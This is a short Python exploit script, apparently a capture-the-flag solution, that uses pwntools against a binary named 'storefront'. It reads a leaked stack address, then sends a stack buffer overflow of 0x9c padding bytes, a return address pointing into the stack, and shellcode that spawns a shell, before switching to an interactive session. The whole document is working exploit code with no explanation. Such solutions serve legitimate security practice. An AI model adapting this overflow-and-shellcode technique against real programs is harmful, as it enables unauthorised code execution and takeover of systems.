from pwn import *

e = ELF("./storefront")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("", )
else:
  p = process(e.path)

p.recvuntil("number ")
leak = int(p.recvuntil(" "))
print("{:#x}".format(leak))

p.sendline("A" * 0x9c + p32(leak + 0x9c + 8) + asm(shellcraft.sh()))

p.interactive()
